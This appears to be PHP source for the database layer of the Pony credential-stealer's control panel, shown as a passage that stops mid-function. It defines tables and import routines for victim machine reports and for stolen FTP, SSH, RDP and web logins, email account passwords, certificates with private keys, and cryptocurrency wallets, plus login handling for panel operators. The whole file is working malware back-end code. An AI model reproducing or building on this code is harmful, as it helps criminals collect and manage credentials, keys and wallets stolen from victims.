<?php

define('CLOG_SOURCE_GATE', 'gate');
define('CLOG_SOURCE_REPORT', 'report');
define('CLOG_SOURCE_LOGIN', 'login');
define('CPONY_FTP_TABLE', 'pony_ftp');
define('CPONY_REPORT_TABLE', 'pony_report');
define('CPONY_REPORT_DATA_TABLE', 'pony_report_data');
define('CPONY_DOMAIN_TABLE', 'pony_domain');
define('CPONY_LOG_TABLE', 'pony_system_log');
define('CPONY_USER_TABLE', 'pony_user');
define('CPONY_CERT_TABLE', 'pony_cert');
define('CPONY_WALLET_TABLE', 'pony_wallet');
define('CPONY_EMAIL_TABLE', 'pony_email');
define('CPONY_DOMAINLIST_TABLE', 'pony_domainlist');

class pony_db
{
    public $db_link;
    protected $database;
    public $state;
    public $privileges;
    public $auth_cookie;
    public $user_id;
    public $login;

    function __construct()
    {
    	$this->state = true;
    	$this->db_link = null;
    	$this->privileges = '';
	}
    
    function connect($host, $user, $pass)
    {
    	global	$use_mysql_persist_connections;
    	if	(!isset($use_mysql_persist_connections))
    		$use_mysql_persist_connections = false;

        // establish the connection
		if ($use_mysql_persist_connections)
		{
			// workaround for PHP warning: MySQL server has gone away
			$this->db_link = @mysql_pconnect($host, $user, $pass);
			if (!$this->db_link || !mysql_ping($this->db_link))
				$this->db_link = mysql_pconnect($host, $user, $pass);
		} else
		{
        	$this->db_link = mysql_connect($host, $user, $pass, true);
        }
        
        if (!$this->db_link)
        {
        	$this->state = false;
        	return false;
		}

        return true;
    }
    
    function select_db($database)
    {
    	if (!$this->state)
    		return false;
    		
    	$select_result = mysql_select_db($database, $this->db_link);
    	
    	if (!$select_result)
    	{
    		$select_result = mysql_query(sprintf('CREATE DATABASE IF NOT EXISTS %s CHARACTER SET cp1251 COLLATE cp1251_general_ci', mysql_real_escape_string($database)), $this->db_link);
    		$select_result = $select_result && mysql_select_db($database, $this->db_link);
		}
    	$this->state = $select_result;
    	$this->state = $this->state && mysql_query('SET NAMES cp1251', $this->db_link);

    	$this->database = $database;
    	return $this->state;
	}

	var $required_tables = array('pony_user', 'pony_ftp', 'pony_report', 'pony_report_data', 'pony_system_log', 'pony_domain',  'pony_chart_helper', 'pony_cert', 'pony_email', 'pony_domainlist', 'pony_wallet');
	
	function all_tables_exist()
	{
		if (!$this->state)
			return false;
		
		$result = mysql_query("SHOW TABLES", $this->db_link);
		if (!$result)
		{
			$this->state = false;
			return false;
		}
		
		$actual_tables = array();

	
		while ($row = mysql_fetch_assoc($result))
		{
			foreach ($row as $table)
			{
				array_push($actual_tables, $table);
			}
		}
		
		$diff = array_diff($this->required_tables, $actual_tables);

		// some required tables found
		if (count($diff) != 0)
		{
			return false;
		}		
		
		return true;
	}

	function some_tables_exist()
	{
		if (!$this->state)
			return false;
		
		$result = mysql_query("SHOW TABLES", $this->db_link);
		if (!$result)
		{
			$this->state = false;
			return false;
		}
		
		$actual_tables = array();
		
		while ($row = mysql_fetch_assoc($result))
		{
			foreach ($row as $table)
			{
				array_push($actual_tables, $table);
			}
		}
		
		$diff = array_intersect($this->required_tables, $actual_tables);

		// some required tables found
		if (count($diff) != 0)
		{
			return true;
		}

		return false;
	}

	function delete_tables()
	{
		if (!$this->state)
			return false;
		
		// some required tables found
		foreach ($this->required_tables as $table_name)
		{
			$this->drop_table($table_name);
		}

		return $this->state;
	}

	function upgrade()
	{
		if (!$this->state)
			return false;
		
		$result = mysql_query("SHOW TABLES", $this->db_link);
		if (!$result)
		{
			$this->state = false;
			return false;
		}
		
		$actual_tables = array();
		
		while ($row = mysql_fetch_assoc($result))
		{
			foreach ($row as $table)
			{
				array_push($actual_tables, $table);
			}
		}

		if (!count($actual_tables))
			return false;

		if (array_search(CPONY_CERT_TABLE, $actual_tables) === false)
		{
			$this->create_data_tables();
		}

		if (array_search(CPONY_WALLET_TABLE, $actual_tables) === false)
		{
			$this->create_data_tables();
		}

		if (array_search(CPONY_EMAIL_TABLE, $actual_tables) === false)
		{
			$this->create_data_tables();
		}

		if (array_search(CPONY_DOMAINLIST_TABLE, $actual_tables) === false)
		{
			$this->create_data_tables();
		}

		return true;
	}

	function upgrade_ftp_table()
	{
		if (!$this->state)
			return false;

		$result = mysql_query("SHOW COLUMNS FROM `pony_ftp` WHERE FIELD='domain_id'", $this->db_link);
		if (!$result)
		{
			$this->state = false;
			return false;
		}

		$needs_update = true;
		if (mysql_fetch_assoc($result))
		{
			$needs_update = false;
		}

		if ($needs_update)
		{
			$this->lock_all_tables();
			$result = mysql_query("ALTER TABLE `pony_ftp` ADD domain_id INT DEFAULT '0' AFTER import_time", $this->db_link);
			if (!$result)
			{
				$this->unlock_all_tables();
				return false;
			}
			$this->unlock_all_tables();

			$result = mysql_query("SELECT ftp_id, url FROM `pony_ftp`", $this->db_link);
			if ($result)
			{
				$query = '';
				$counter = 0;
				while ($row = mysql_fetch_assoc($result))
				{
					$domain = trim(extract_domain($row['url']));
					if (strlen($domain))
					{
						$query .= ",('".mysql_real_escape_string($domain)."')";
						if ($counter++ > 1000)
						{
							$update_result = mysql_query('INSERT IGNORE INTO pony_domainlist (url_domain) VALUES '.substr($query, 1), $this->db_link);
							$counter = 0;
							$query = '';
							if (!$update_result)
							{
								$this->state = false;
								return false;
							}
						}
					}
				}
				if (strlen($query))
				{
					$update_result = mysql_query('INSERT IGNORE INTO pony_domainlist (url_domain) VALUES '.substr($query, 1), $this->db_link);
					if (!$update_result)
					{
						$this->state = false;
						return false;
					}
				}
			}

			$result = mysql_query("SELECT ftp_id, url FROM `pony_ftp`", $this->db_link);
			if ($result)
			{
				while ($row = mysql_fetch_assoc($result))
				{
					$domain = trim(extract_domain($row['url']));
					$update_result = mysql_query("UPDATE `pony_ftp` SET domain_id = IFNULL((SELECT domain_id FROM `pony_domainlist` WHERE url_domain='".mysql_real_escape_string($domain)."'), '0') WHERE ftp_id='".mysql_real_escape_string($row['ftp_id'])."'", $this->db_link);
					if (!$update_result)
					{
						$this->state = false;
						return false;
					}
				}
			}
		}
	}

	function connect_db($host, $user, $pass, $database, $verbose = false)
	{
		if (!$this->connect($host, $user, $pass))
		{
			if ($verbose)
				die('cannot connect to mysql database');
			else
				die();
		}

		if (!$this->select_db($database))
		{
			if ($verbose)
				die('cannot select mysql database');
			else
				die();
		}

		$this->upgrade();
		$tables_exist = $this->all_tables_exist();

		if (!$this->state)
		{
			if ($verbose)
				die('mysql database error');
			else
				die();
		}

		if (!$tables_exist)
		{
			if ($verbose)
				die ('missing required mysql database tables');
			else
				die();
		} else
		{
			$this->upgrade_ftp_table();
		}

		return true;
	}

    // close connection
    function close()
    { 
		// check connection
        if ($this->db_link)
        {
        	mysql_close($this->db_link);
        	$this->state = false;
        }
    }

    function create_data_tables()
    {
		$result = mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_report
    		(
				report_id INT NOT NULL AUTO_INCREMENT, 
				PRIMARY KEY(report_id),
				parsed BOOL DEFAULT FALSE,
				import_time DATETIME,
				KEY(import_time),
				report_os_name VARCHAR(150),
				report_country CHAR(2),
				report_is_win64 BOOL,
				report_admin BOOL,
				report_source_ip CHAR(15),
				report_hwid CHAR(40),
				report_version VARCHAR(10),
				data_id INT NOT NULL,
				KEY(data_id)
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
    		", $this->db_link);

		$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_report_data
    		(
				data_id INT NOT NULL AUTO_INCREMENT, 
				PRIMARY KEY(data_id),
				data_hash CHAR(40) NOT NULL,
				UNIQUE KEY (data_hash),
				data LONGBLOB
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
    		", $this->db_link);
    		
    	$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_ftp
    		(
				ftp_id INT NOT NULL AUTO_INCREMENT, 
				PRIMARY KEY(ftp_id),
				report_id INT NOT NULL,
				KEY(report_id),
				url TEXT NOT NULL,
				url_hash CHAR(40) NOT NULL,
				UNIQUE KEY(url_hash),
				url_type ENUM('ftp', 'ssh', 'http', 'https', 'rdp', 'vnc') NOT NULL,
				KEY(url_type),
				ftp_client VARCHAR(50),
				import_time DATETIME,
				KEY(import_time),
				domain_id INT DEFAULT '0'
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", $this->db_link);

    	$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_domainlist
    		(
				domain_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(domain_id),
				url_domain VARCHAR(250) NOT NULL,
				UNIQUE(url_domain)
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", $this->db_link);

    	$result = $result && mysql_query(sprintf("
    		CREATE TABLE IF NOT EXISTS pony_system_log
    		(
				log_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(log_id),
				report_id INT DEFAULT NULL,
				KEY(report_id),
				log_line VARCHAR(250),
				log_source ENUM('%s', '%s', '%s') NOT NULL,
				log_type ENUM('notify', 'error', 'other') NOT NULL,
				log_extra VARCHAR(250),
				import_time DATETIME
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", CLOG_SOURCE_GATE, CLOG_SOURCE_REPORT, CLOG_SOURCE_LOGIN),
			$this->db_link);

    	$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_cert
    		(
				cert_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(cert_id),
				report_id INT NOT NULL,
				KEY(report_id),
				import_time DATETIME,
				KEY(import_time),
				cert_client VARCHAR(50),
				data_hash CHAR(40) NOT NULL,
				UNIQUE KEY(data_hash),
				cert_data LONGBLOB,
				pvtkey_data LONGBLOB
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			",
			$this->db_link);

    	$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_wallet
    		(
				wallet_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(wallet_id),
				report_id INT NOT NULL,
				KEY(report_id),
				import_time DATETIME,
				KEY(import_time),
				wallet_client VARCHAR(50),
				data_hash CHAR(40) NOT NULL,
				UNIQUE KEY(data_hash),
				wallet_data LONGBLOB
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			",
			$this->db_link);

    	$result = $result && mysql_query("
    		CREATE TABLE IF NOT EXISTS pony_email
    		(
				email_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(email_id),
				report_id INT NOT NULL,
				KEY(report_id),
				import_time DATETIME,
				KEY(import_time),
				email_client VARCHAR(50),
				email_hash CHAR(40) NOT NULL,
				UNIQUE KEY(email_hash),
				protocol ENUM('smtp', 'imap', 'nntp', 'http', 'pop3', 'other') NOT NULL,
				email VARCHAR(250) NOT NULL,
				server VARCHAR(250) NOT NULL,
				port INT DEFAULT '0',
				user VARCHAR(250) NOT NULL,
				pass VARCHAR(250) NOT NULL
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			",
			$this->db_link);


		return $result;
    }

    function create_tables()
    {
    	if (!$this->state)
    		return false;
    	    
    	$result = mysql_query("
    		CREATE TABLE pony_user
    		(
				user_id INT NOT NULL AUTO_INCREMENT, 
				PRIMARY KEY(user_id),
				username VARCHAR(100) NOT NULL UNIQUE,
				password VARCHAR(50) NOT NULL,
				privileges VARCHAR(200) NOT NULL,
				auth_cookie VARCHAR(50) DEFAULT NULL,
				lang VARCHAR(50) NULL,
				settings TEXT,
				time_offset INT
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", $this->db_link);		
		    	
		$result = $result && $this->create_data_tables();

    	$result = $result && mysql_query("
    		CREATE TABLE pony_domain
    		(
				domain_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(domain_id),
				url TEXT,
				url_hash CHAR(40) NOT NULL UNIQUE,
				ping_status VARCHAR(100),
				ping_time DATETIME,
				import_time DATETIME
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", $this->db_link);

    	$result = $result && mysql_query("
    		CREATE TABLE pony_chart_helper
    		(
				chart_id INT NOT NULL AUTO_INCREMENT,
				PRIMARY KEY(chart_id),
				chart_type VARCHAR(50),
				update_time DATETIME,
				image_hash CHAR(40),
				KEY(image_hash)
			)
    		CHARACTER SET cp1251
    		COLLATE cp1251_general_ci
    		ENGINE = MYISAM
			", $this->db_link);
				
		if (!$result)
		{
			$this->state = false;
		}
		
		return $result;
	}
	
	function priv_is_admin()
	{
		return $this->privileges == 'admin_all';
	}
	
	function priv_can_delete()
	{
		return strpos($this->privileges, 'all') !== false;
	}
	
	function priv_is_user($privileges)
	{
		return strpos($privileges, 'user') !== false;
	}
	
	function domain_exists($url_hash)
	{
		$url_hash = trim($url_hash);
		
    	if (!$this->state || !strlen($url_hash))
    		return false;
    		
		$query = sprintf("SELECT domain_id FROM pony_domain WHERE (url_hash='%s') LIMIT 1",
            mysql_real_escape_string($url_hash));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}
		
	function add_domain($domain)
	{
		$domain = trim($domain);
		
		$hash = mixed_sha1($domain);
		if (!$this->state || !strlen($domain) || $this->domain_exists($hash))
    		return false;
    		
		$query = sprintf("INSERT INTO pony_domain
			(url, url_hash, import_time) 
			VALUES ('%s', '%s', '%s')",
			mysql_real_escape_string($domain),			// url
			mysql_real_escape_string($hash),			// url_hash
            mysql_real_escape_string(mysql_now_date())  // import_time
            );

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		}
		
		return true;		
	}
	
	function user_exists($login)
	{
		$login = trim($login);
		
    	if (!$this->state || !strlen($login))
    		return false;
    		
		$query = sprintf("SELECT privileges FROM pony_user WHERE (username='%s') LIMIT 1",
            mysql_real_escape_string($login));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}

	function user_id_exists($id)
	{
		$id = intval($id);
		
    	if (!$this->state || $id <= 0)
    		return false;
    		
		$query = sprintf("SELECT user_id FROM pony_user WHERE (user_id='%s') LIMIT 1",
            mysql_real_escape_string($id));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}
	
    function add_user($login, $password, $privileges = 'user_all', $lang = '')
    {
    	$login = trim($login);
    	$password = trim($password);
    	$privileges = trim($privileges);
    	$lang = trim($lang);
    	
    	if (!$this->state || !strlen($login) || !strlen($password) || !strlen($privileges))
    		return false;
    		
		// check for duplicate addition
    	if ($this->user_exists($login))
    		return false;

		$query = sprintf("INSERT INTO pony_user(username, password, privileges, lang) VALUES ('%s', '%s', '%s', '%s')",
            mysql_real_escape_string($login),
            mysql_real_escape_string(mixed_sha1($password)),
            mysql_real_escape_string($privileges),
            mysql_real_escape_string($lang));
                		
		$result = mysql_query($query, $this->db_link);
		    	
		if (!$result)
		{
			$this->state = false;
			return false;
		}
			
		return true;
	}

    function update_user($user_id, $password, $privileges = 'user_all', $lang = '')
    {
    	$user_id = intval($user_id);
    	$password = trim($password);
    	$privileges = trim($privileges);
    	$lang = trim($lang);
    	
    	if (!$this->state || !strlen($privileges) || $user_id <= 0)
    		return false;
    		
		// check for duplicate addition
    	if (!$this->user_id_exists($user_id))
    		return false;

		$query = sprintf("UPDATE %s SET privileges='%s'",
            mysql_real_escape_string(CPONY_USER_TABLE),
            mysql_real_escape_string($privileges));

    	if (strlen($password))
    	{
    		$query .= sprintf(", password='%s'", mysql_real_escape_string(mixed_sha1($password)));
    		$query .= sprintf(", auth_cookie=NULL"); // force user to relogin
    	}

    	if (strlen($lang))
    		$query .= sprintf(", lang='%s'", mysql_real_escape_string($lang));

    	$query .= sprintf(" WHERE user_id='%s'", mysql_real_escape_string($user_id));
    		
		$result = mysql_query($query, $this->db_link);
		    	
		if (!$result)
		{
			$this->state = false;
			return false;
		}
			
		return true;
	}
	
    function delete_user($user_id)
    {
    	$user_id = intval($user_id);
    	
    	if (!$this->state || $user_id <= 0 || !$this->user_id_exists($user_id))
    		return false;
    		
		$query = sprintf("DELETE FROM %s WHERE (user_id='%s')",
            mysql_real_escape_string(CPONY_USER_TABLE),
            mysql_real_escape_string($user_id));
                		
		$result = mysql_query($query, $this->db_link);
		    	
		if (!$result)
		{
			$this->state = false;
			return false;
		}
			
		return true;
	}
	
	function get_user_list(&$user_list)
	{
    	if (!$this->state)
    		return false;

		$query = sprintf("SELECT * FROM %s WHERE (privileges!='admin_all')", 
			mysql_real_escape_string(CPONY_USER_TABLE));
			
		$result = mysql_query($query, $this->db_link);
		
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				array_push($user_list, 
					array('user_id' => $row['user_id'], 
						'username' => $row['username'], 
						'password' => $row['password'], 
						'privileges' => $row['privileges']
					)
				);
			}
			return true;
		}
		
		return false;	
	}	

	function get_user_data($user_id)
	{
		$user_id = intval($user_id);
    	if (!$this->state || $user_id <= 0)
    		return false;

		$query = sprintf("SELECT * FROM %s WHERE (user_id='%s') LIMIT 1", 
			mysql_real_escape_string(CPONY_USER_TABLE),
			mysql_real_escape_string($user_id));
			
		$result = mysql_query($query, $this->db_link);
		
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return	array('user_id' => $row['user_id'], 
							'username' => $row['username'], 
							'password' => $row['password'], 
							'privileges' => $row['privileges']
					);
			}
		}
		
		return false;	
	}	
	
	function autneticate_cookie($cookie)
	{
		$cookie = trim($cookie);
    	if (!$this->state || !strlen($cookie))
    		return false;
    		
		$query = sprintf("SELECT user_id, privileges, username FROM pony_user WHERE (auth_cookie='%s') LIMIT 1",
            mysql_real_escape_string($cookie));
                	
		$result = mysql_query($query, $this->db_link);
	
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
			{
				$row = mysql_fetch_assoc($result);
				if ($row)
				{
					$this->privileges = $row['privileges'];
					$this->auth_cookie = $cookie;
					$this->login = $row['username'];
					$this->user_id = $row['user_id'];
					return true;
				}
			}
		}
		
		return false;		
	}

	function update_auth_cookie($user_id, $new_cookie)
	{
		$user_id = intval($user_id);
		$new_cookie = trim($new_cookie);
    	if (!$this->state || $user_id < 0 || !strlen($new_cookie))
    		return false;
    		
		$query = sprintf("UPDATE pony_user SET auth_cookie='%s' WHERE (user_id='%s')",
            mysql_real_escape_string($new_cookie),
            mysql_real_escape_string($user_id));
        
        $result = mysql_query($query, $this->db_link);
                                            
		if (!$result)
		{
			$this->state = false;
		} else
		{
			$this->auth_cookie = $new_cookie;
			return true;
		}
		
		return false;
	}

	function remove_auth_cookie($cookie)
	{
		$cookie = trim($cookie);
    	if (!$this->state || !strlen($cookie))
    		return false;
    		
		$query = sprintf("UPDATE pony_user SET auth_cookie=NULL WHERE (auth_cookie='%s')",
            mysql_real_escape_string($cookie));
        
        $result = mysql_query($query, $this->db_link);
                                            
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;
	}
	
	function check_password($password)
	{
		$password = trim($password);
    	if (!$this->state || !strlen($password))
    		return false;
    		
		$query = sprintf("SELECT password FROM pony_user WHERE (user_id='%s' AND auth_cookie='%s') LIMIT 1",
			mysql_real_escape_string($this->user_id),
            mysql_real_escape_string($this->auth_cookie));
                	
		$result = mysql_query($query, $this->db_link);
	
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
			{
				$row = mysql_fetch_assoc($result);
				if ($row)
				{
					if ($row['password'] == mixed_sha1($password))
						return true;
				}
			}
		}
		
		return false;		
	}

	function change_password($password)
	{
		$password = trim($password);
    	if (!$this->state || !strlen($password))
    		return false;
    		
		$query = sprintf("UPDATE pony_user SET password='%s' WHERE (user_id='%s' AND auth_cookie='%s') LIMIT 1",
			mysql_real_escape_string(mixed_sha1($password)),
			mysql_real_escape_string($this->user_id),
            mysql_real_escape_string($this->auth_cookie));
                	
		$result = mysql_query($query, $this->db_link);
	
		if (!$result)
		{
			$this->state = false;
		} else
		{
				return true;
		}
		
		return false;		
	}
	
	function authenticate($login, $password)
	{
		$login = trim($login);
		$password = trim($password);
		
    	if (!$this->state || !strlen($login) || !strlen($password))
    		return false;
    		
   		$password = mixed_sha1($password);
    		
		$query = sprintf("SELECT user_id, privileges FROM pony_user WHERE (username='%s' AND password='%s') LIMIT 1",
            mysql_real_escape_string($login),
            mysql_real_escape_string($password));
                	
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
			{
				$row = mysql_fetch_assoc($result);
				if ($row)
				{
					$this->user_id = $row['user_id'];
					$this->update_auth_cookie($row['user_id'], mixed_sha1(12345*microtime()));
					$this->privileges = $row['privileges'];
					$this->login = $login;
					return true;
				}
			}
		}
		
		return false;
	}	

	function import_url_list($url_list, $report_id)
	{
		$report_id = intval($report_id);
		
		if (!$this->state || $report_id <= 0)
			return false;

		
		$query = '';
		foreach ($url_list as $ftp_list_item)
		{
			list($url, $ftp_client) = $ftp_list_item;
			$domain = trim(extract_domain($url));
			if (strlen($domain))
			{
				$query .= ",('".mysql_real_escape_string($domain)."')";
			}
		}

		if (strlen($query))
		{
			$result = mysql_query('INSERT IGNORE INTO pony_domainlist (url_domain) VALUES '.substr($query, 1), $this->db_link);
			if (!$result)
			{
				return false;
			}
		}

		$query_values = '';
		foreach ($url_list as $ftp_list_item)
		{
			list($url, $ftp_client) = $ftp_list_item;

			$url = trim($url);
			$ftp_client = trim($ftp_client);

			if (!strlen($url) || !strlen($ftp_client))
				continue;

			$hash = mixed_sha1($url);

			if (str_begins($url, 'rdp://'))
			{
				$url_type = 'rdp';
			} elseif (str_begins($url, 'http://') || str_begins($url, 'https://'))
			{
				$url_type = 'http';
			}
			elseif (str_begins($url, 'sftp://'))
			{
				$url_type = 'ssh';
				$url = 'ftp://'.substr($url, strlen('sftp://'));
			}
			else
			{
				$url_type = 'ftp';
			}

			if (!strlen($query_values))
				$query_values .= 'VALUES';

			$query_values .= sprintf("('%s','%s','%s','%s','%s','%s',IFNULL((SELECT domain_id FROM `pony_domainlist` WHERE url_domain='%s'), '0')),",
				mysql_real_escape_string($report_id),		 // report_id
				mysql_real_escape_string($url),				 // url
				mysql_real_escape_string($url_type),		 // url_type
				mysql_real_escape_string($hash),			 // url_hash
				mysql_real_escape_string($ftp_client),		 // ftp_client
            	mysql_real_escape_string(mysql_now_date()),  // import_time
            	mysql_real_escape_string(extract_domain($url)) // url domain
            );
		}
		$query_values = substr($query_values, 0, -1);

		if (strlen($query_values))
		{
			$query = "INSERT DELAYED IGNORE INTO pony_ftp (report_id, url, url_type, url_hash, ftp_client, import_time, domain_id) ".
				$query_values;

			$result = mysql_query($query, $this->db_link);

			if (!$result)
			{
				return false;
			}
		}
		
		return true;		
	}

	function import_email_list($email_list, $report_id)
	{
		$report_id = intval($report_id);
		
		if (!$this->state || $report_id <= 0)
			return false;

		$query_values = '';
		foreach ($email_list as $email_list_item)
		{
			list($email, $email_client) = $email_list_item;

			$email_client = trim($email_client);

			$email_hash = mixed_sha1(report_parser::flat_email_array($email));

			if (!strlen($query_values))
				$query_values .= 'VALUES';

			$query_values .= sprintf("('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s'),",
				mysql_real_escape_string($report_id),				// report_id
            	mysql_real_escape_string(mysql_now_date()),			// import_time
				mysql_real_escape_string($email_client),			// email_client
				mysql_real_escape_string($email_hash),				// dupe-check hash
				mysql_real_escape_string($email['protocol']),		// protocol
				mysql_real_escape_string($email['email']),			// email
				mysql_real_escape_string($email['server']),			// server
				mysql_real_escape_string(strval(intval($email['port']))), // port
				mysql_real_escape_string($email['user']),			// user
				mysql_real_escape_string($email['pass'])			// pass
            );
		}
		$query_values = substr($query_values, 0, -1);

		if (strlen($query_values))
		{
			$query = "INSERT DELAYED IGNORE INTO pony_email (report_id, import_time, email_client, email_hash, protocol, email, server, port, user, pass) ".
				$query_values;

			$result = mysql_query($query, $this->db_link);
		
			if (!$result)
			{
				return false;
			}
		}
		
		return true;		
	}

	function report_exists($data_hash)
	{
		$data_hash = trim($data_hash);
		
    	if (!$this->state || !strlen($data_hash))
    		return false;
    		
		$query = sprintf("SELECT data_id FROM pony_report_data WHERE data_hash='%s' LIMIT 1",
            mysql_real_escape_string($data_hash));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}

	function report_id_exists($report_id)
	{
		$report_id = intval($report_id);
		
		if (!$this->state || $report_id <= 0)
			return false;
    		
		$query = sprintf("SELECT report_id FROM pony_report WHERE report_id='%s' LIMIT 1",
            mysql_real_escape_string($report_id));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}
	
	function add_log_line($log_line, $log_source, $report_id = null, $log_extra = '')
	{
		$log_line = trim($log_line);
		$log_source = trim($log_source);
		
    	if (!$this->state || !strlen($log_line) || !strlen($log_source))
    		return false;
    		
		if (preg_match('/^NOTIFY_/', $log_line))
			$log_type = 'notify';
		elseif (preg_match('/^ERR_/', $log_line))
			$log_type = 'error';
		elseif (preg_match('/^ERROR_/', $log_line))
			$log_type = 'error';
		else
			$log_type = 'other';

		$query = sprintf("INSERT DELAYED INTO pony_system_log
			(report_id, log_line, log_source, log_type, log_extra, import_time) 
			VALUES (%s, '%s', '%s', '%s', '%s', '%s')",
			($report_id === null)?'NULL':"'".mysql_real_escape_string($report_id)."'", // report_id
			mysql_real_escape_string($log_line),									// log_line
			mysql_real_escape_string($log_source),									// log_source
			mysql_real_escape_string($log_type),									// log_type
			mysql_real_escape_string($log_extra),									// log_extra
            mysql_real_escape_string(mysql_now_date())								// import_time
            );

		$result = mysql_query($query, $this->db_link);
	
		if (!$result)
		{
			$this->state = false;
			return false;
		}
		
		return true;		
	}

	function import_log_list($log_list, $log_source, $report_id = null)
	{

    	if (!$this->state)
    		return false;

		if (!is_array($log_list) || !count($log_list))
			return true;

		$query_values = '';

		foreach ($log_list as $log_item)
		{
			list($log_line, $log_extra) = $log_item;
			$log_line = trim($log_line);
			$log_extra = trim($log_extra);

			if (preg_match('/^NOTIFY_/', $log_line))
				$log_type = 'notify';
			elseif (preg_match('/^ERR_/', $log_line))
				$log_type = 'error';
			elseif (preg_match('/^ERROR_/', $log_line))
				$log_type = 'error';
			else
				$log_type = 'other';

			if (!strlen($log_line) || !strlen($log_source))
				continue;

			$query_values .= sprintf(
				"(%s,'%s','%s','%s','%s','%s'),",
				($report_id === null)?'NULL':"'".mysql_real_escape_string($report_id)."'", // report_id
				mysql_real_escape_string($log_line),									// log_line
				mysql_real_escape_string($log_source),									// log_source
				mysql_real_escape_string($log_type),									// log_type
				mysql_real_escape_string($log_extra),									// log_extra
	            mysql_real_escape_string(mysql_now_date())								// import_time
            );
		}

		$query_values = substr($query_values, 0, -1);

		if (strlen($query_values))
		{
			$query = "INSERT DELAYED INTO pony_system_log (report_id, log_line, log_source, log_type, log_extra, import_time) VALUES ".
				$query_values;

			$result = mysql_query($query, $this->db_link);
		
			if (!$result)
			{
				return false;
			}
		}
		
		return true;
	}
	
	function update_parsed_report($report_id, $os_name, $is_win64, $is_admin, $hwid, $version, $ftp_list, $log, $cert_list = null, $wallet_list = null, $email_list = null)
	{
		$report_id = intval($report_id);
		if ($report_id <= 0)
			return false;
			
		$query = sprintf("UPDATE pony_report SET
			parsed='1', report_os_name='%s', report_is_win64='%s', report_admin='%s', report_hwid='%s', report_version='%s'
			WHERE report_id='%s'",
			mysql_real_escape_string($os_name),						// report_os_name
			mysql_real_escape_string(intval($is_win64 == 1)),		// report_is_win64
			mysql_real_escape_string(intval($is_admin == 1)),		// report_admin
            mysql_real_escape_string($hwid),						// report_hwid
            mysql_real_escape_string($version),						// report_version
            mysql_real_escape_string($report_id)
		);

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		} else
		{
			// write url (ftp/http) list
			$this->import_url_list($ftp_list, $report_id);
			if (!$this->state)
				return false;

			// write cert list
			if ($cert_list !== null)
			{
				foreach ($cert_list as $cert_list_item)
				{
					list($cert_data, $cert_client) = $cert_list_item;
					$this->add_cert($cert_data[0], $cert_data[1], $cert_client, $report_id);
					if (!$this->state)
						return false;
				}
			}

			// write wallet list
			if ($wallet_list !== null)
			{
				foreach ($wallet_list as $wallet_list_item)
				{
					list($wallet_data, $wallet_client) = $wallet_list_item;
					$this->add_wallet($wallet_data, $wallet_client, $report_id);
					if (!$this->state)
						return false;
				}
			}

			// write email list
			if ($email_list !== null)
			{
				$this->import_email_list($email_list, $report_id);
				if (!$this->state)
					return false;
			}

			// write logs
			if ($log !== null)
			{
				$this->import_log_list($log, CLOG_SOURCE_REPORT, $report_id);
				if (!$this->state)
					return false;
			}
		}

		return true;
	}
	
	function add_nonparsed_report($ip, $country, $data)
	{
		if (strlen($data) == 0)
			return false;
			
		$hash = mixed_sha1($data);
		if (!$this->state || $this->report_exists($hash))
		{
    		return false;
		}
    		
		$query = sprintf("INSERT INTO pony_report_data(data_hash, data) VALUES('%s', '%s')",
